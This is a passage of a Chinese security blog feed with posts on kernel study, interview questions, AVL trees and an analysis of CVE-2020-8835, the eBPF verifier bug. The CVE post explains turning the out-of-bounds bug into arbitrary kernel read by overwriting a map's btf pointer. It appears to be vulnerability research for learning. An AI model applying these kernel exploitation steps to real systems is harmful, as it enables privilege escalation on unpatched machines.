rel="noopener">https://xz.aliyun.com/t/2814</a></p><p>这个技巧好用是好用，但是linux内核默认是不开启userfaultfd系统调用的，较为鸡肋</p><h1 id="0x06-实战分析"><a href="#0x06-实战分析" class="headerlink" title="0x06 实战分析"></a>0x06 实战分析</h1><p>利用方式学完了，就可以考虑自己实战分析一些漏洞了，由于linux的源码是开源的，有一个交叉引用的网址，可以让我们很好的分析各个版本的源代码</p><ul><li><a href="https://elixir.bootlin.com/linux/v5.4.7/source/kernel" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.4.7/source/kernel</a></li></ul><p>之后，就是实际环境搭建了，那么当我们拿到了漏洞版本的内核，需要编译成我们想要的模块，那么我们必然了解linux的kernel的编译方式，可以参考我的文章 <strong>linux kernel kconfig</strong></p><p>环境搭建好了就是调试了 不再赘述</p><h1 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h1><p>想要入门kernel其实远远没有我讲的这么容易，可能你需要缺很多基础，人和人学的是不一样的，当你学不下去kernel的时候，就应该回头看自己缺什么，这个是比较难的，我就因为操作系统基础不够卡了半年，而不自知，难搞</p>]]></content>
    
    <summary type="html">
    
      linux kernel学习路线
    
    </summary>
    
    
    
      <category term="linux,kernel" scheme="http://yoursite.com/tags/linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>面试相关</title>
    <link href="http://yoursite.com/2020/05/24/%E9%9D%A2%E8%AF%95%E7%9B%B8%E5%85%B3/"/>
    <id>http://yoursite.com/2020/05/24/面试相关/</id>
    <published>2020-05-24T11:46:09.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li>int指令和syscall指令的区别</li></ul><p>参考： <a href="https://www.ibm.com/developerworks/cn/linux/kernel/l-k26ncpu/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/kernel/l-k26ncpu/index.html</a></p><p><a href="https://bbs.pediy.com/thread-258975.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-258975.htm</a></p><ul><li>从磁盘读取文件的过程</li></ul><p>其实磁盘读取的过程，我是了解过的，但是，没有用过忘记具体的过程了，，，记录一下。读取磁盘一般都是通过bios中断来读取的，参考： </p><p><a href="https://en.wikipedia.org/wiki/INT_13H" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/INT_13H</a></p><p>总的来说，有两种方式一种是chs模式，另一种是lea模式，chs是一种比较古老的方式，面向的是磁盘模型</p><p><a href="https://en.wikipedia.org/wiki/Cylinder-head-sector" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Cylinder-head-sector</a></p><p>你需要指定柱面-磁头-扇区来确定你要读的数据块，而lea模式是将磁盘虚拟成一系列大小相同的连续块，你只需要指定你要读的块即可，实际上是对chs模式的一种包装</p><p><a href="https://en.wikipedia.org/wiki/Logical_block_addressing" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Logical_block_addressing</a></p><ul><li>一个结构体有一个char，short，int成员，成员的顺序会不会影响结构体大小</li></ul><p>直觉上不会，其实会的，，考虑一种这样的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct t1&#123;</span><br><span class="line">char a; // 占1填充3</span><br><span class="line">int b; // 4</span><br><span class="line">short c; // 占2对齐填充2</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct t2&#123;</span><br><span class="line">char a;  // 占1填充1</span><br><span class="line">short b; //2</span><br><span class="line">int c; //4</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>你会发现第一次sizeof之后的结果是12,第二个是8。。。其实内存对齐的规则不仅仅只有4字节和8字节对齐</p><p><a href="https://www.nowcoder.com/questionTerminal/c50e91a934d642a486b02b8417dd3ca9?toCommentId=641562" target="_blank" rel="noopener">https://www.nowcoder.com/questionTerminal/c50e91a934d642a486b02b8417dd3ca9?toCommentId=641562</a></p><p>A. 对于结构的各个成员，第一个成员位于偏移为0的位置，以后每个数据成员的偏移量必须是这个数据成员的自身长度的倍数。 </p><p>  B.在数据成员完成各自对齐之后，结构本身也要进行对齐，对齐将按照#pragma pack指定的数值和结构最大数据成员长度中，比较小的那个进行</p><ul><li>python字典插入1000元素的时间复杂度</li></ul><p>因为我没学过算法，盲猜O（1）,之后问了acm大佬才知道字典的实现是hash列表，我还以为是数组实现的。。。当时和面试官扯皮，python的实现，回来想想字典确实适合hash列表实现，算法有点差。。。有待补充</p>]]></content>
    
    <summary type="html">
    
      这里总结一下面试没有回答出来的问题
    
    </summary>
    
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>AVL树</title>
    <link href="http://yoursite.com/2020/04/20/AVL%E6%A0%91/"/>
    <id>http://yoursite.com/2020/04/20/AVL树/</id>
    <published>2020-04-19T16:15:17.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-AVL树"><a href="#0x00-AVL树" class="headerlink" title="0x00 AVL树"></a>0x00 AVL树</h1><p>AVL树是平衡二叉查找树，在AVL树中任何节点的两个子树的高度最大差别为1,所以，也被称为高度平衡树。他有以下特点：</p><ul><li>本身首先是一颗二叉搜索树</li><li>他的左右子树高度差的绝对值最多为1</li><li>他的左右子树都为AVL树</li></ul><p>而二叉搜索树是</p><ul><li>他的左子树的所有值&lt;=根节点&lt;=右子树</li><li>他的左右子树都是二叉搜索树</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct tree_node&#123;</span><br><span class="line">int key;  //value值</span><br><span class="line">struct tree *left,*right;//左右子树</span><br><span class="line">int height;//树的高度</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="0x01-树旋转"><a href="#0x01-树旋转" class="headerlink" title="0x01 树旋转"></a>0x01 树旋转</h1><p>这个就比较有意思了，这个操作发生于树不平衡的情况，这时候就要用旋转操作来平衡树，但也不是整个树也要跟着旋转，一般是子树旋转 </p><p>参考：<a href="https://blog.csdn.net/qq_25343557/article/details/89110319" target="_blank" rel="noopener">https://blog.csdn.net/qq_25343557/article/details/89110319</a></p><p>那么问题来了，怎么确定旋转的根节点呢，</p><h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><p>算法岂是我等弟弟能学的</p>]]></content>
    
    <summary type="html">
    
      在看mmu的时候，看到avl树不太会，记录一下
    
    </summary>
    
    
    
      <category term="数据结构" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>cve-2020-8835分析</title>
    <link href="http://yoursite.com/2020/04/15/cve-2020-8835%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/04/15/cve-2020-8835分析/</id>
    <published>2020-04-15T01:57:58.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这个cve复现了好久，主要是一直准备面试来着，不能全心全意的复现，主要是第一个poc还写错了。。。。浪费了许多时间</p><h1 id="0x01-BPF模块"><a href="#0x01-BPF模块" class="headerlink" title="0x01 BPF模块"></a>0x01 BPF模块</h1><p>简单来说，bpf（Berkeley Packet Filter）模块用于包过滤，用户态可以通过bpf syscall（内核编译选项默认关闭，需要自己开启）向内核注入代码，当然，经过严格的check，内核在通过llvm或者Clang的编译器将c提交伪代码，编译为BPF目标程序，用户态提交代码之后，内核不会立即执行，内核会先模拟执行，以下为参考资料</p><ul><li><a href="https://www.kernel.org/doc/html/latest/bpf/index.html" target="_blank" rel="noopener">https://www.kernel.org/doc/html/latest/bpf/index.html</a></li><li><a href="http://man7.org/linux/man-pages/man2/bpf.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/bpf.2.html</a></li><li><a href="https://cilium.readthedocs.io/en/latest/bpf/" target="_blank" rel="noopener">https://cilium.readthedocs.io/en/latest/bpf/</a></li><li><a href="https://elixir.bootlin.com/linux/v5.6/source/Documentation/networking/filter.txt" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6/source/Documentation/networking/filter.txt</a></li><li><a href="https://blog.csdn.net/pwl999/article/details/82884882" target="_blank" rel="noopener">https://blog.csdn.net/pwl999/article/details/82884882</a></li></ul><h1 id="0x02-bpf使用"><a href="#0x02-bpf使用" class="headerlink" title="0x02 bpf使用"></a>0x02 bpf使用</h1><p>参考：</p><ul><li><a href="https://elixir.bootlin.com/linux/v5.6/source/samples/bpf/sock_example.c" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6/source/samples/bpf/sock_example.c</a></li></ul><p>其实和x86汇编没啥区别，主要是对map操作的时候，需要注意一下几点</p><ul><li>r1-r5为参数</li><li>r0为返回值</li><li>返回值在结束的时候必须清0</li><li>r2为参数的时候必须指向stack</li><li>r0返回的一个指针并不是map[0]的值</li></ul><p>示例操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">      BPF_ALU64_IMM(BPF_MOV,BPF_REG_6,0),</span><br><span class="line">      BPF_STX_MEM(BPF_DW,BPF_REG_10,BPF_REG_6,-8),</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_2,BPF_REG_10),</span><br><span class="line">      BPF_ADD64_IMM(BPF_REG_2,-8),</span><br><span class="line">      BPF_LD_MAP_FD(BPF_REG_1,cmd_fd),</span><br><span class="line">      BPF_MAP_LOOKUP(),</span><br><span class="line">      BPF_JMP_IMM(BPF_JNE,BPF_REG_0,0,1),</span><br><span class="line">      BPF_EXIT_INSN(),</span><br><span class="line">      BPF_LDX_MEM(BPF_DW,BPF_REG_6,BPF_REG_0,0),</span><br><span class="line">BPF_ALU64_IMM(BPF_MOV,BPF_REG_0,0)</span><br></pre></td></tr></table></figure><p>r0是一个指向map[0]的指针（<del>并不一定是0.。。。</del>），那么，你call完之后map肯定不是0,所以，你可以用JNE判断一下，是否成功</p><p>现在着重说两条指令：</p><ul><li>BPF_LDX_MEM</li></ul><p><strong>BPF_LDX_MEM</strong>  其实就是一个取内存的操作,参考定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span><br><span class="line"></span><br><span class="line">#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)\</span><br><span class="line">((struct bpf_insn) &#123;\</span><br><span class="line">.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\</span><br><span class="line">.dst_reg = DST,\</span><br><span class="line">.src_reg = SRC,\</span><br><span class="line">.off   = OFF,\</span><br><span class="line">.imm   = 0 &#125;)</span><br></pre></td></tr></table></figure><p>这个操作主要用于从map中读出到寄存器</p><ul><li>BPF_STX_MEM</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span><br><span class="line"></span><br><span class="line">#define BPF_STX_MEM(SIZE, DST, SRC, OFF)\</span><br><span class="line">((struct bpf_insn) &#123;\</span><br><span class="line">.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\</span><br><span class="line">.dst_reg = DST,\</span><br><span class="line">.src_reg = SRC,\</span><br><span class="line">.off   = OFF,\</span><br><span class="line">.imm   = 0 &#125;)</span><br></pre></td></tr></table></figure><p>这个操作主要用于把寄存器的值存到map里，也可以把寄存器的值存到stack里面，那么问题来了，那要update_element 这个回调函数有啥用。。。。(ops一般都是这个map类型的独有操作。。。。所以，还是用)</p><ul><li>BPF_LD_IMM64</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#define BPF_LD_IMM64(DST, IMM)\</span><br><span class="line">BPF_LD_IMM64_RAW(DST, 0, IMM)</span><br><span class="line">#define BPF_LD_IMM64_RAW(DST, SRC, IMM)\</span><br><span class="line">((struct bpf_insn) &#123;\</span><br><span class="line">.code  = BPF_LD | BPF_DW | BPF_IMM,\</span><br><span class="line">.dst_reg = DST,\</span><br><span class="line">.src_reg = SRC,\</span><br><span class="line">.off   = 0,\</span><br><span class="line">.imm   = (__u32) (IMM) &#125;),\</span><br><span class="line">((struct bpf_insn) &#123;\</span><br><span class="line">.code  = 0, /* zero is reserved opcode */\</span><br><span class="line">.dst_reg = 0,\</span><br><span class="line">.src_reg = 0,\</span><br><span class="line">.off   = 0,\</span><br><span class="line">.imm   = ((__u64) (IMM)) &gt;&gt; 32 &#125;)</span><br></pre></td></tr></table></figure><p>这个宏用来将64位立即数一次性的MOV进64位的寄存器</p><h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h1><p>主要是在模拟执行的时候，范围判断错误导致任意读写，分析参考</p><ul><li><a href="https://dayjun.top/2020/04/21/CVE-2020-8835-Linux-eBPF模块verifier组件漏洞分析/" target="_blank" rel="noopener">https://dayjun.top/2020/04/21/CVE-2020-8835-Linux-eBPF%E6%A8%A1%E5%9D%97verifier%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li><li><a href="https://www.anquanke.com/post/id/203416" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203416</a></li><li><a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification" target="_blank" rel="noopener">https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification</a></li></ul><h1 id="0x04-从越界读写到任意读写"><a href="#0x04-从越界读写到任意读写" class="headerlink" title="0x04 从越界读写到任意读写"></a>0x04 从越界读写到任意读写</h1><p>这个地方ZDI已经给出了方法</p><h2 id="0x00-任意地址读"><a href="#0x00-任意地址读" class="headerlink" title="0x00 任意地址读"></a>0x00 任意地址读</h2><p>在操作arrary map的时候，主要的结构体为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct bpf_array &#123;</span><br><span class="line">struct bpf_map map;</span><br><span class="line">u32 elem_size;</span><br><span class="line">u32 index_mask;</span><br><span class="line">struct bpf_array_aux *aux;</span><br><span class="line">union &#123;</span><br><span class="line">char value[0] __aligned(8);</span><br><span class="line">void *ptrs[0] __aligned(8);</span><br><span class="line">void __percpu *pptrs[0] __aligned(8);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>里面map结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">struct bpf_map &#123;</span><br><span class="line">/* The first two cachelines with read-mostly members of which some</span><br><span class="line"> * are also accessed in fast-path (e.g. ops, max_entries).</span><br><span class="line"> */</span><br><span class="line">const struct bpf_map_ops *ops ____cacheline_aligned;</span><br><span class="line">struct bpf_map *inner_map_meta;</span><br><span class="line">#ifdef CONFIG_SECURITY</span><br><span class="line">void *security;</span><br><span class="line">#endif</span><br><span class="line">enum bpf_map_type map_type;</span><br><span class="line">u32 key_size;</span><br><span class="line">u32 value_size;</span><br><span class="line">u32 max_entries;</span><br><span class="line">u32 map_flags;</span><br><span class="line">int spin_lock_off; /* &gt;=0 valid offset, &lt;0 error */</span><br><span class="line">u32 id;</span><br><span class="line">int numa_node;</span><br><span class="line">u32 btf_key_type_id;</span><br><span class="line">u32 btf_value_type_id;</span><br><span class="line">struct btf *btf;</span><br><span class="line">struct bpf_map_memory memory;</span><br><span class="line">char name[BPF_OBJ_NAME_LEN];</span><br><span class="line">u32 btf_vmlinux_value_type_id;</span><br><span class="line">bool unpriv_array;</span><br><span class="line">bool frozen; /* write-once; write-protected by freeze_mutex */</span><br><span class="line">/* 22 bytes hole */</span><br><span class="line"></span><br><span class="line">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span><br><span class="line"> * particularly with refcounting.</span><br><span class="line"> */</span><br><span class="line">atomic64_t refcnt ____cacheline_aligned;</span><br><span class="line">atomic64_t usercnt;</span><br><span class="line">struct work_struct work;</span><br><span class="line">struct mutex freeze_mutex;</span><br><span class="line">u64 writecnt; /* writable mmap cnt; protected by freeze_mutex */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>里面有个btf结构体在bpf_map_get_info_by_fd函数(<del>bpf syscall 的BPF_OBJ_GET_INFO_BY_FD会call这个函数</del>)中用到，由于你有越界读写自然可以把map结构体的btf结构体改成任意地址，然后就可以任意地址读四个字节</p><h2 id="0x01-任意读写的其他-失败-思路"><a href="#0x01-任意读写的其他-失败-思路" class="headerlink" title="0x01 任意读写的其他(失败)思路"></a>0x01 任意读写的其他(<del>失败</del>)思路</h2><p>那么问题来了这样做太复杂了，我弄的简单一点通过syscall就能任意地址读写,以下是我的几种(<del>失败</del>)思路</p><h3 id="0x00-copy-from-user"><a href="#0x00-copy-from-user" class="headerlink" title="0x00 copy_from_user"></a>0x00 copy_from_user</h3><p>我想到copy_from_user和copy_to_user如果可以把他的ops一些回调函数改成copy_from_user和copy_to_user的话,，那不就是任意地址读写了吗，然后发现第一个参数必须得是map。。。。要不然check不过。。。。</p><h4 id="0x00-理想分析"><a href="#0x00-理想分析" class="headerlink" title="0x00 理想分析"></a>0x00 理想分析</h4><p>一开始没有考虑参数的问题，所以就详细分析了一下copy_from_user，以下是我对copy_from_user 的分析，首先看copy_from_user的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static __always_inline unsigned long __must_check</span><br><span class="line">copy_from_user(void *to, const void __user *from, unsigned long n)</span><br><span class="line">&#123;</span><br><span class="line">if (likely(check_copy_size(to, n, false)))</span><br><span class="line">n = _copy_from_user(to, from, n);</span><br><span class="line">return n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从利用的角度来讲，这个check_copy_size能绕过则过(意思是能调用_copy_from_user函数就不调用copy_from_user函数)，我们可以看到实质做copy的操作是_copy_from_user函数，我们跟进这个函数，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">static inline __must_check unsigned long</span><br><span class="line">_copy_from_user(void *to, const void __user *from, unsigned long n)</span><br><span class="line">&#123;</span><br><span class="line">unsigned long res = n;</span><br><span class="line">might_fault();</span><br><span class="line">if (likely(access_ok(from, n))) &#123;</span><br><span class="line">kasan_check_write(to, n);</span><br><span class="line">res = raw_copy_from_user(to, from, n);</span><br><span class="line">&#125;</span><br><span class="line">if (unlikely(res))</span><br><span class="line">memset(to + (n - res), 0, res);</span><br><span class="line">return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到还是一些check所以，真正做执行的是raw_copy_from_user()函数，所以，再看raw_copy_from_user()函数，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">static inline __must_check unsigned long</span><br><span class="line">raw_copy_from_user(void *to, const void __user * from, unsigned long n)</span><br><span class="line">&#123;</span><br><span class="line">if (__builtin_constant_p(n)) &#123;</span><br><span class="line">switch(n) &#123;</span><br><span class="line">case 1:</span><br><span class="line">*(u8 *)to = *(u8 __force *)from;</span><br><span class="line">return 0;</span><br><span class="line">case 2:</span><br><span class="line">*(u16 *)to = *(u16 __force *)from;</span><br><span class="line">return 0;</span><br><span class="line">case 4:</span><br><span class="line">*(u32 *)to = *(u32 __force *)from;</span><br><span class="line">return 0;</span><br><span class="line">#ifdef CONFIG_64BIT</span><br><span class="line">case 8:</span><br><span class="line">*(u64 *)to = *(u64 __force *)from;</span><br><span class="line">return 0;</span><br><span class="line">#endif</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">memcpy(to, (const void __force *)from, n);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这个函数，我们看到这个是真正做操作的地方，而且没有任何check，这正是我们要找的函数，然而，你如果找这个函数的地址的话，无论从system.ma还是从vmlinux里面里边，你都找不到这个函数，只能找到_copy_from_user函数，因为我的vmlinux太大了，所以，我只能从gdb看汇编代码，虽然，可以用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble /m</span><br></pre></td></tr></table></figure><p>去看汇编和源码的对应关系，但是一般不太准，所以，还得看汇编，如果你看汇编的话，你会看到他call了一个copy_user_generic_unrolled函数，所以，我们看一下copy_user_generic_unrolled的汇编代码，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff83ab1fc0 &lt;+0&gt;:     nop</span><br><span class="line">0xffffffff83ab1fc1 &lt;+1&gt;:     nop</span><br><span class="line">0xffffffff83ab1fc2 &lt;+2&gt;:     nop</span><br><span class="line">0xffffffff83ab1fc3 &lt;+3&gt;:     cmp    edx,0x8</span><br><span class="line">0xffffffff83ab1fc6 &lt;+6&gt;:     jb     0xffffffff83ab2058 &lt;copy_user_generic_unrolled+152&gt;</span><br><span class="line">0xffffffff83ab1fcc &lt;+12&gt;:    mov    ecx,edi</span><br><span class="line">0xffffffff83ab1fce &lt;+14&gt;:    and    ecx,0x7</span><br><span class="line">0xffffffff83ab1fd1 &lt;+17&gt;:    je     0xffffffff83ab1fe8 &lt;copy_user_generic_unrolled+40&gt;</span><br><span class="line">0xffffffff83ab1fd3 &lt;+19&gt;:    sub    ecx,0x8</span><br><span class="line">0xffffffff83ab1fd6 &lt;+22&gt;:    neg    ecx</span><br><span class="line">0xffffffff83ab1fd8 &lt;+24&gt;:    sub    edx,ecx</span><br><span class="line">0xffffffff83ab1fda &lt;+26&gt;:    mov    al,BYTE PTR [rsi]</span><br><span class="line">0xffffffff83ab1fdc &lt;+28&gt;:    mov    BYTE PTR [rdi],al</span><br><span class="line">0xffffffff83ab1fde &lt;+30&gt;:    inc    rsi</span><br><span class="line">0xffffffff83ab1fe1 &lt;+33&gt;:    inc    rdi</span><br><span class="line">0xffffffff83ab1fe4 &lt;+36&gt;:    dec    ecx</span><br><span class="line">0xffffffff83ab1fe6 &lt;+38&gt;:    jne    0xffffffff83ab1fda &lt;copy_user_generic_unrolled+26&gt;</span><br><span class="line">0xffffffff83ab1fe8 &lt;+40&gt;:    mov    ecx,edx</span><br><span class="line">0xffffffff83ab1fea &lt;+42&gt;:    and    edx,0x3f</span><br><span class="line">0xffffffff83ab1fed &lt;+45&gt;:    shr    ecx,0x6</span><br><span class="line">0xffffffff83ab1ff0 &lt;+48&gt;:    je     0xffffffff83ab203c &lt;copy_user_generic_unrolled+124&gt;</span><br><span class="line">0xffffffff83ab1ff2 &lt;+50&gt;:    mov    r8,QWORD PTR [rsi]</span><br><span class="line">0xffffffff83ab1ff5 &lt;+53&gt;:    mov    r9,QWORD PTR [rsi+0x8]</span><br><span class="line">0xffffffff83ab1ff9 &lt;+57&gt;:    mov    r10,QWORD PTR [rsi+0x10]</span><br><span class="line">0xffffffff83ab1ffd &lt;+61&gt;:    mov    r11,QWORD PTR [rsi+0x18]</span><br><span class="line">0xffffffff83ab2001 &lt;+65&gt;:    mov    QWORD PTR [rdi],r8</span><br><span class="line">0xffffffff83ab2004 &lt;+68&gt;:    mov    QWORD PTR [rdi+0x8],r9</span><br><span class="line">0xffffffff83ab2008 &lt;+72&gt;:    mov    QWORD PTR [rdi+0x10],r10</span><br><span class="line">0xffffffff83ab200c &lt;+76&gt;:    mov    QWORD PTR [rdi+0x18],r11</span><br><span class="line">0xffffffff83ab2010 &lt;+80&gt;:    mov    r8,QWORD PTR [rsi+0x20]</span><br><span class="line">0xffffffff83ab2014 &lt;+84&gt;:    mov    r9,QWORD PTR [rsi+0x28]</span><br><span class="line">0xffffffff83ab2018 &lt;+88&gt;:    mov    r10,QWORD PTR [rsi+0x30]</span><br><span class="line">0xffffffff83ab201c &lt;+92&gt;:    mov    r11,QWORD PTR [rsi+0x38]</span><br><span class="line">0xffffffff83ab2020 &lt;+96&gt;:    mov    QWORD PTR [rdi+0x20],r8</span><br><span class="line">0xffffffff83ab2024 &lt;+100&gt;:   mov    QWORD PTR [rdi+0x28],r9</span><br><span class="line">0xffffffff83ab2028 &lt;+104&gt;:   mov    QWORD PTR [rdi+0x30],r10</span><br><span class="line">0xffffffff83ab202c &lt;+108&gt;:   mov    QWORD PTR [rdi+0x38],r11</span><br><span class="line">0xffffffff83ab2030 &lt;+112&gt;:   lea    rsi,[rsi+0x40]</span><br><span class="line">0xffffffff83ab2034 &lt;+116&gt;:   lea    rdi,[rdi+0x40]</span><br><span class="line">0xffffffff83ab2038 &lt;+120&gt;:   dec    ecx</span><br><span class="line">0xffffffff83ab203a &lt;+122&gt;:   jne    0xffffffff83ab1ff2 &lt;copy_user_generic_unrolled+50&gt;</span><br><span class="line">0xffffffff83ab203c 